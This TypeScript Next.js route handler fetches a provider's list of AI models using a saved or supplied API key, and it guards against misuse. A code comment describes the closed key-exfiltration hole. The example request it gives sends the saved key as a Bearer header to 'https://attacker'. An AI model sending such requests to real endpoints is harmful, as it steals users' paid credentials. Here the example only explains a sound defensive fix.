import { readFile } from "node:fs/promises";
import { NextResponse } from "next/server";
import { homePaths } from "@merrymen/home";
import { getSettingsStore } from "@merrymen/settings-store";
import { isHostedMode, llmProviderById, type MerrymenSettings } from "@merrymen/core";
import { tenantOf } from "@/lib/auth";

export const dynamic = "force-dynamic";

interface FetchModelsBody {
  provider?: string;
  apiKey?: string;
  baseUrl?: string;
}

/**
 * THE SAME SETTINGS THE REST OF THE PRODUCT READS.
 *
 * This read only ~/.merrymen/settings.json — a file that does not exist on the
 * hosted deploy, where a tenant's settings live in the per-tenant encrypted
 * store and the global file belongs to nobody. So `saved` came back empty for
 * every hosted tenant, the saved Groq key was never attached, and the request
 * went to the provider with no Authorization header at all. Groq answered 401,
 * and the settings page printed "Could not load AI models. Check your provider
 * and key" — beside a key field showing dots, which is to say beside the key it
 * had just declined to use. Reported by two testers as showing "all the time,
 * but everything is set". It was.
 *
 * Mirrors readStored in /api/settings exactly, including the refusal to fall
 * back to the global file when hosted: those settings are not this tenant's,
 * and reading somebody else's key here would be worse than not reading one.
 */
async function readSavedSettings(req: Request): Promise<MerrymenSettings> {
  const tenant = isHostedMode() ? tenantOf(req) : null;
  if (isHostedMode()) return tenant ? ((await getSettingsStore().get(tenant)) ?? {}) : {};
  try {
    return JSON.parse(
      (await readFile(homePaths.settings(), "utf8")).replace(/^﻿/, ""),
    ) as MerrymenSettings;
  } catch {
    return {};
  }
}

function normalizeUrl(base: string): string {
  return base.replace(/\/+$/, "") + "/models";
}

function filterModelId(id: string): string {
  if (/^[A-Za-z0-9._/:-]{1,128}$/.test(id)) return id;
  return "";
}

export async function POST(req: Request) {
  let body: FetchModelsBody;
  try {
    body = (await req.json()) as FetchModelsBody;
  } catch {
    return NextResponse.json({ error: "invalid JSON body" }, { status: 400 });
  }

  const saved = await readSavedSettings(req);
  const providerId = body.provider || saved.llmProvider;
  if (!providerId) {
    return NextResponse.json({ error: "no provider specified and none saved" }, { status: 400 });
  }

  const prov = llmProviderById(providerId);
  if (!prov) {
    return NextResponse.json({ error: `unknown provider: ${providerId}` }, { status: 400 });
  }

  let apiKey = body.apiKey || "";
  if (!apiKey) {
    if (prov.id === "groq") apiKey = saved.groqApiKey ?? "";
    else if (prov.id === "anthropic") apiKey = saved.anthropicApiKey ?? "";
    else apiKey = saved.llmApiKey ?? "";
  }

  let baseUrl = prov.baseUrl;
  if (prov.id === "custom") {
    // WHOSE URL AND WHOSE KEY MUST NOT COME FROM DIFFERENT PLACES.
    //
    // Before this guard, POSTing {provider:"custom", baseUrl:"https://attacker"}
    // with no apiKey made the route load the SAVED llmApiKey out of
    // ~/.merrymen/settings.json and send it as `Authorization: Bearer` to that
    // URL — a key-exfiltration oracle sitting on a dashboard that has no login.
    // middleware.ts limits who can reach it, but "only locally exploitable" is
    // not the standard for a file holding a paid API credential.
    //
    // So: a caller-supplied base URL may only ever be probed with a
    // caller-supplied key. The stored key is reachable only through the stored
    // URL, which is the pairing the user actually consented to.
    const bodyUrl = body.baseUrl?.trim();
    if (bodyUrl && bodyUrl !== saved.llmBaseUrl && !body.apiKey) {
      return NextResponse.json(
        { error: "a custom base URL must be sent with its own API key — the saved key is not used for an unsaved URL" },
        { status: 400 },
      );
    }
    baseUrl = bodyUrl || saved.llmBaseUrl || "";
    if (!baseUrl) {
      return NextResponse.json({ error: "custom provider requires a base URL" }, { status: 400 });
    }
  }

  let modelsUrl: string;
  let headers: Record<string, string> = {};

  if (prov.transport === "anthropic") {
    modelsUrl = "https://api.anthropic.com/v1/models";
    if (apiKey) {
      headers["x-api-key"] = apiKey;
      headers["anthropic-version"] = "2023-06-01";
    }
  } else if (prov.id === "google") {
    modelsUrl = "https://generativelanguage.googleapis.com/v1beta/models";
    if (apiKey) {
      headers["x-goog-api-key"] = apiKey;
    }
  } else {
    modelsUrl = normalizeUrl(baseUrl);
    if (apiKey) {
      headers["Authorization"] = `Bearer ${apiKey}`;
    }
  }

  try {
    const res = await fetch(modelsUrl, { headers, signal: AbortSignal.timeout(10000) });
    if (!res.ok) {
      const text = await res.text().catch(() => "");
      const detail = text ? ` (${text.slice(0, 200)})` : "";
      return NextResponse.json(
        { error: `provider returned ${res.status}${detail}` },
        { status: 502 },
      );
    }

    const json = (await res.json()) as Record<string, unknown>;
    let rawModels: unknown[] = [];

    if (prov.id === "google") {
      const m = json.models;
      if (Array.isArray(m)) rawModels = m;
    } else if (prov.transport === "anthropic") {
      const d = json.data;
      if (Array.isArray(d)) rawModels = d;
    } else {
      const d = json.data;
      if (Array.isArray(d)) rawModels = d;
    }

    const models: string[] = [];
    for (const entry of rawModels) {
      if (entry && typeof entry === "object") {
        let id = "";
        if ("id" in (entry as Record<string, unknown>)) {
          id = String((entry as Record<string, unknown>).id);
        } else if ("name" in (entry as Record<string, unknown>)) {
          id = String((entry as Record<string, unknown>).name).replace(/^models\//, "");
        }
        const filtered = filterModelId(id);
        if (filtered) models.push(filtered);
      }
    }

    models.sort((a, b) => a.localeCompare(b));
    return NextResponse.json({ models });
  } catch (err) {
    const message = err instanceof Error ? err.message : "unknown error";
    return NextResponse.json({ error: message }, { status: 502 });
  }
}
